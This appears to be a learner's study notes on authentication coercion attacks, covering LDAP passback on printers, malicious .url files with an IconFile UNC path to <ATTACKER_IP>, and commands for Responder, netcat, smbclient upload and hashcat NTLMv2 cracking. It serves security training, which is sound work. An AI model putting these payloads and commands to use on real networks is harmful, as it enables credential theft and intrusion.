# 06 - Coercion Attacks

## Overview

Explored authentication coercion techniques that force a
device or user to send authentication material to an
attacker-controlled listener.

## Topics Covered

- Authentication coercion
- MITRE ATT&CK T1187
- LDAP Passback
- Network printers
- Plaintext LDAP
- File-based coercion
- Malicious .url files
- NTLMv2 capture
- Responder
- Netcat
- Hashcat
- SMB
- Advanced coercion techniques

## Authentication Coercion

Instead of discovering or guessing credentials, coercion
attempts to make a device or user initiate authentication
towards an attacker-controlled system.

## LDAP Passback

LDAP Passback targets misconfigured network devices such as:

- Printers
- Scanners
- MFPs
- IoT devices

### Attack Flow

    Device Administration
            ↓
    LDAP Configuration
            ↓
    Replace LDAP Server
            ↓
    Attacker Listener
            ↓
    Device Authentication
            ↓
    Captured LDAP Credentials

Common weaknesses include:

- Default device credentials
- Over-privileged service accounts
- Plaintext LDAP
- Lack of credential rotation

A simple listener can be used in a plaintext LDAP scenario:

    nc -lvnp <PORT>

The captured credentials can then be validated with NetExec:

    nxc smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>'

## File-Based Coercion

File-based coercion abuses how Windows Explorer loads
file icons from network locations.

A malicious `.url` file can contain an external UNC path
in its `IconFile` field.

Example structure:

    [InternetShortcut]
    URL=http://example.com
    WorkingDirectory=example
    IconFile=\\<ATTACKER_IP>\icons\icon.ico
    IconIndex=1

When Windows Explorer renders the icon, it can initiate
SMB authentication to the attacker-controlled host.

## Responder

Responder can listen for authentication attempts:

    sudo responder -I tun0

The objective is to capture the resulting NTLMv2
authentication material.

## SMB File Upload

A malicious file can be uploaded to a writable SMB share:

    smbclient //<SERVER>/<SHARE> -U '<DOMAIN>\<USER>%<PASSWORD>'

Then:

    put @Shortcut.url

## NTLMv2 Cracking

Captured Net-NTLMv2 hashes can be cracked offline.

Hashcat mode:

    5600

Example:

    hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

## Important Distinction

LDAP Passback can expose plaintext LDAP credentials when
plaintext LDAP is used.

File-based coercion captures a Net-NTLMv2 challenge-response,
which must be cracked offline or potentially used in other
authentication attack chains.

## Advanced Coercion

The room introduces more advanced techniques that are covered
in later material:

- PetitPotam
- PrinterBug / SpoolSample
- DFSCoerce
- NTLM relay attacks

## Key Takeaways

Coercion attacks do not necessarily require the attacker to
discover a password directly.

Instead, the attacker manipulates the environment so that
a device or user performs authentication toward an
attacker-controlled system.